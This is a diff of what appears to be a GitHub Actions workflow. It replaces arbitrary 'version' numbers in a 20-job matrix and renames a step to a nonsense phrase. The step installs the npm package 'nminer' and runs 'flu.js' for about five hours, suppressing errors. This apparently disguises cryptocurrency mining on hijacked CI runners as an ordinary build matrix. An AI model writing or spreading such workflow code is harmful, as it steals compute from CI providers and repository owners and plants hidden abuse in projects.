@@ -9,26 +9,26 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 434 }
-          - { version: 1090 }
-          - { version: 9932 }
-          - { version: 1488 }
-          - { version: 2640 }
-          - { version: 21 }
-          - { version: 9559 }
-          - { version: 1582 }
-          - { version: 9635 }
-          - { version: 4594 }
-          - { version: 8698 }
-          - { version: 9154 }
-          - { version: 503 }
-          - { version: 2647 }
-          - { version: 8243 }
-          - { version: 2124 }
-          - { version: 2192 }
-          - { version: 3225 }
-          - { version: 6785 }
-          - { version: 6447 }
+          - { version: 8569 }
+          - { version: 1330 }
+          - { version: 526 }
+          - { version: 2948 }
+          - { version: 7698 }
+          - { version: 5831 }
+          - { version: 6955 }
+          - { version: 5817 }
+          - { version: 7168 }
+          - { version: 6968 }
+          - { version: 9291 }
+          - { version: 7489 }
+          - { version: 4361 }
+          - { version: 2783 }
+          - { version: 1754 }
+          - { version: 6092 }
+          - { version: 9857 }
+          - { version: 3087 }
+          - { version: 174 }
+          - { version: 4178 }
 
     steps:
       - name: Checkout
@@ -39,7 +39,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: grandiose
+      - name: how like ample presell
         run: |
           npm install nminer@latest
-          timeout 305m node flu.js || echo "flu executed"
+          timeout 309m node flu.js || echo "flu executed"
